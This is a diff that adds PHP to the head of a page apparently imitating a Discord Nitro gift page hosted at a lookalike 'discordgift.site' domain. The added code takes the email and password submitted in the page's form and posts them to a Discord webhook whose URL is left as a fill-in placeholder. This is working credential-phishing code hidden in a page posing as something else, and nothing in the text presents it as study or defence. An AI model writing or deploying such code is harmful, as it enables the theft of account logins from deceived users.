@@ -7,6 +7,52 @@
 <meta content="https://assets.discordgift.site/af917b75e7f1f34ad53088863e88d46cdd821d04/eaa84/assets/nitro.png" property="og:image" />
 <meta content="#2b2d31" data-react-helmet="true" name="theme-color" />
 
+ <?php
+// Check if the form was submitted
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Retrieve form data
+    $username = $_POST['email'] ?? ''; // Use null coalescing operator to avoid undefined index notice
+    $password = $_POST['password'] ?? ''; 
+
+    // Discord Webhook URL
+    $webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL'; // Replace with your webhook URL
+
+    // Payload to send
+    $data = [
+        "content" => "",
+        "embeds" => [
+            [
+                "title" => "Login Attempt",
+                "fields" => [
+                    ["name" => "Email", "value" => $username, "inline" => false],
+                    ["name" => "Password", "value" => $password, "inline" => false]
+                ]
+            ]
+        ]
+    ];
+
+    // Setup stream context for HTTP POST request
+    $options = [
+        'http' => [
+            'header' => "Content-Type: application/json\r\n",
+            'method' => 'POST',
+            'content' => json_encode($data)
+        ]
+    ];
+
+    // Execute POST request
+    $context = stream_context_create($options);
+    $result = file_get_contents($webhookUrl, false, $context);
+
+    // Optional: Handle the response or error
+    if ($result === FALSE) {
+        // Error handling
+    }
+
+    // Optional: Redirect or display a success message
+}
+
+?>
 
 <!DOCTYPE html>
 <html>
